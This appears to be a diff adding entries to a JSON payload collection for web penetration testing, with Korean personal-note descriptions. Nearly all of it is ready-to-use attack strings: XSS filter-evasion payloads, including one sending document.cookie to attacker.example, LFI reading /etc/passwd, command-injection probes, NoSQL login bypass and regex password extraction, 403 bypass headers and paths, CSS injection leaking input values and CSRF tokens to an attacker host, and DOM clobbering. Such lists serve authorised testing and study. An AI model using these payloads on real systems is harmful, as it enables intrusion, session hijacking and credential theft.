@@ -1050,6 +1050,102 @@
           "description": "백틱 호출",
           "risk": "high",
           "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_65",
+          "name": "confirm 우회",
+          "payload": "<img src=x onerror=confirm()>",
+          "description": "alert 필터 시 confirm · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_66",
+          "name": "대문자 sCript",
+          "payload": "<sCript>confirm()</sCript>",
+          "description": "태그 대소문자 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_67",
+          "name": "prompt 우회",
+          "payload": "<img src=x onerror=prompt()>",
+          "description": "confirm 필터 시 prompt · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_68",
+          "name": "svg location js",
+          "payload": "<svg onload=location='javascript:alert(1)'>",
+          "description": "location 기반 실행 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_69",
+          "name": "octal escape innerHTML",
+          "payload": "<svg onload=innerHTML='\\74img/src/onerror\\75alert\\501\\51\\76'>",
+          "description": "8진 이스케이프 우회 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_70",
+          "name": "키워드 분할(중첩태그)",
+          "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+          "description": "제거후 재조합 우회 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_71",
+          "name": "이벤트명 중복",
+          "payload": "<img src=x oonnerror=alert(1)>",
+          "description": "키워드 제거 후 남는 우회 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_72",
+          "name": "scheme 내 탭",
+          "payload": "<iframe src=\"javascri\tpt:alert(1)\">",
+          "description": "탭으로 스킴 분리 우회 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_73",
+          "name": "scheme HTML엔티티 탭",
+          "payload": "<iframe src=\"jav&#x09;ascript:alert(1)\">",
+          "description": "엔티티 탭 우회 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_74",
+          "name": "유니코드 이스케이프 location",
+          "payload": "<iframe src=\"javascript:locati\\u006fn.href='//attacker.example/?c='+document.cookie\">",
+          "description": "유니코드 이스케이프 쿠키탈취 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_75",
+          "name": "이벤트핸들러 탐지",
+          "payload": "<x onxxx=1",
+          "description": "커스텀태그 이벤트 허용범위 탐지 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+        },
+        {
+          "id": "xss_76",
+          "name": "srcdoc 중첩 우회",
+          "payload": "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
+          "description": "srcdoc 컨텍스트 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
         }
       ],
       "group": "client"
@@ -1702,6 +1798,22 @@
           "description": "네트워크 연결",
           "risk": "low",
           "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_47",
+          "name": "null byte 종료(구PHP)",
+          "payload": "../../../../../../../../etc/passwd%00",
+          "description": "확장자 강제 무력화 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "lfi_48",
+          "name": "설정파일 local.xml",
+          "payload": "/etc/local.xml",
+          "description": "앱 설정 파일 · 내 정리노트",
+          "risk": "low",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
         }
       ],
       "group": "server"
@@ -1990,6 +2102,22 @@
           "description": "OOB wget",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_38",
+          "name": "에코 반사 확인",
+          "payload": "abc;echo commandi;",
+          "description": "응답 반사로 취약 확인 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "cmdi_39",
+          "name": "무해 PoC",
+          "payload": "abc;whoami;",
+          "description": "무해 명령 PoC · 내 정리노트",
+          "risk": "high",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
         }
       ],
       "group": "server"
@@ -2514,6 +2642,30 @@
           "description": "존재 조건",
           "risk": "medium",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        },
+        {
+          "id": "nosql_20",
+          "name": "URL 연산자 인증우회",
+          "payload": "uid[$ne]=a&upw[$ne]=a",
+          "description": "쿼리스트링 $ne 인증우회 · 내 정리노트",
+          "risk": "critical",
+          "reference": "https://portswigger.net/web-security/nosql-injection"
+        },
+        {
+          "id": "nosql_21",
+          "name": "regex 접두 탐색",
+          "payload": "{\"pw\":{\"$regex\":\"^a\"}}",
+          "description": "비번 접두 이진탐색 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/nosql-injection"
+        },
+        {
+          "id": "nosql_22",
+          "name": "타입혼동 에러유발",
+          "payload": "admin=false\"}{\"admin\":\"1\"}",
+          "description": "타입 혼동으로 에러/우회 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/nosql-injection"
         }
       ],
       "group": "server"
@@ -4290,6 +4442,297 @@
         }
       ],
       "group": "client"
+    },
+    {
+      "id": "access403",
+      "name": "403 / 401 Bypass",
+      "icon": "🚧",
+      "color": "#e67e22",
+      "group": "auth",
+      "payloads": [
+        {
+          "id": "access403_01",
+          "name": "X-Custom-IP-Authorization",
+          "payload": "X-Custom-IP-Authorization: 127.0.0.1",
+          "description": "IP 인가 헤더 스푸핑 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_02",
+          "name": "X-Forwarded-For 127.0.0.1",
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "description": "내부 IP 위장 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_03",
+          "name": "X-Forwarded-Host localhost",
+          "payload": "X-Forwarded-Host: localhost",
+          "description": "호스트 위장 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_04",
+          "name": "X-Real-IP 127.0.0.1",
+          "payload": "X-Real-IP: 127.0.0.1",
+          "description": "실 IP 헤더 위장 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_05",
+          "name": "X-Originating-IP",
+          "payload": "X-Originating-IP: 127.0.0.1",
+          "description": "원발신 IP 위장 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_06",
+          "name": "X-Remote-IP / X-Remote-Addr",
+          "payload": "X-Remote-IP: 127.0.0.1",
+          "description": "원격 IP 위장 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_07",
+          "name": "X-Client-IP",
+          "payload": "X-Client-IP: 127.0.0.1",
+          "description": "클라이언트 IP 위장 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_08",
+          "name": "Referer localhost",
+          "payload": "Referer: http://localhost",
+          "description": "리퍼러 신뢰 우회 · 내 정리노트",
+          "risk": "low",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_09",
+          "name": "Host localhost",
+          "payload": "Host: localhost",
+          "description": "호스트 신뢰 우회 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_10",
+          "name": "경로 %2e",
+          "payload": "/%2e/secret",
+          "description": "점 인코딩 경로 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_11",
+          "name": "경로 끝 슬래시",
+          "payload": "/secret/",
+          "description": "트레일링 슬래시 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_12",
+          "name": "경로 슬래시닷",
+          "payload": "/secret/.",
+          "description": "닷 세그먼트 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_13",
+          "name": "경로 이중슬래시",
+          "payload": "//secret//",
+          "description": "중복 슬래시 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_14",
+          "name": "경로 세미콜론",
+          "payload": "/secret/..;/",
+          "description": "세미콜론 세그먼트 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        },
+        {
+          "id": "access403_15",
+          "name": "경로 %20",
+          "payload": "/secret%20",
+          "description": "공백 접미 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_16",
+          "name": "경로 %09",
+          "payload": "/secret%09",
+          "description": "탭 접미 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_17",
+          "name": "경로 %00",
+          "payload": "/secret%00",
+          "description": "널바이트 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_18",
+          "name": "경로 확장자 위장",
+          "payload": "/secret.json",
+          "description": "확장자 우회 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_19",
+          "name": "경로 물음표",
+          "payload": "/secret?",
+          "description": "쿼리 접미 · 내 정리노트",
+          "risk": "low",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_20",
+          "name": "경로 # 프래그먼트",
+          "payload": "/secret#",
+          "description": "프래그먼트 · 내 정리노트",
+          "risk": "low",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_21",
+          "name": "인코딩 %2f",
+          "payload": "/%2fsecret",
+          "description": "슬래시 인코딩 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_22",
+          "name": "이중 인코딩 %252f",
+          "payload": "/%252fsecret",
+          "description": "이중 인코딩 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_23",
+          "name": "유니코드 슬래시",
+          "payload": "/%ef%bc%8fsecret",
+          "description": "유니코드 전각 슬래시 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://www.hahwul.com/2021/10/08/bypass-403/"
+        },
+        {
+          "id": "access403_24",
+          "name": "메서드 변경",
+          "payload": "POST /admin (원래 GET)",
+          "description": "HTTP 메서드 우회 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses"
+        }
+      ]
+    },
+    {
+      "id": "cssinj",
+      "name": "CSS Injection",
+      "icon": "🎨",
+      "color": "#e84393",
+      "group": "client",
+      "payloads": [
+        {
+          "id": "cssinj_01",
+          "name": "@import 외부 로드",
+          "payload": "@import 'https://attacker.example/x.css';",
+          "description": "외부 CSS 로드(최상단 필요) · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://github.com/cure53/HTTPLeaks/blob/main/leak.html"
+        },
+        {
+          "id": "cssinj_02",
+          "name": "background url 유출",
+          "payload": "background: url(https://attacker.example/leak);",
+          "description": "배경 이미지로 핑백 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://github.com/cure53/HTTPLeaks/blob/main/leak.html"
+        },
+        {
+          "id": "cssinj_03",
+          "name": "@font-face src",
+          "payload": "@font-face{font-family:l;src:url(https://attacker.example/f);}",
+          "description": "폰트 로드로 핑백 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://github.com/cure53/HTTPLeaks/blob/main/leak.html"
+        },
+        {
+          "id": "cssinj_04",
+          "name": "hex escape url",
+          "payload": "background-image:\\000075\\000072\\00006C(https://attacker.example/x);",
+          "description": "url을 hex 이스케이프로 우회 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://github.com/cure53/HTTPLeaks/blob/main/leak.html"
+        },
+        {
+          "id": "cssinj_05",
+          "name": "속성 선택자 값 탈취",
+          "payload": "input[value^='a']{background:url(https://attacker.example/?a)}",
+          "description": "input value 문자 탈취 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://github.com/cure53/HTTPLeaks/blob/main/leak.html"
+        },
+        {
+          "id": "cssinj_06",
+          "name": "CSRF 토큰 탈취",
+          "payload": "input[name=csrf][value^='x']{background:url(//attacker.example/?x)}",
+          "description": "토큰 이진 탈취 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://github.com/cure53/HTTPLeaks/blob/main/leak.html"
+        }
+      ]
+    },
+    {
+      "id": "domclob",
+      "name": "DOM Clobbering",
+      "icon": "🧷",
+      "color": "#00b894",
+      "group": "client",
+      "payloads": [
+        {
+          "id": "domclob_01",
+          "name": "anchor 전역변수 덮기",
+          "payload": "<a id=x><a id=x name=y href=cid:&quot;onerror=alert(1)//>",
+          "description": "전역 변수 clobbering · 내 정리노트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/dom-based/dom-clobbering"
+        },
+        {
+          "id": "domclob_02",
+          "name": "defaultAvatar clobber",
+          "payload": "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">",
+          "description": "DOMPurify cid 우회 · 내 정리노트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/dom-based/dom-clobbering"
+        },
+        {
+          "id": "domclob_03",
+          "name": "form/input name 덮기",
+          "payload": "<form id=config><input name=isAdmin value=1>",
+          "description": "폼 요소로 속성 덮기 · 내 정리노트",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/dom-based/dom-clobbering"
+        }
+      ]
     }
   ]
 }
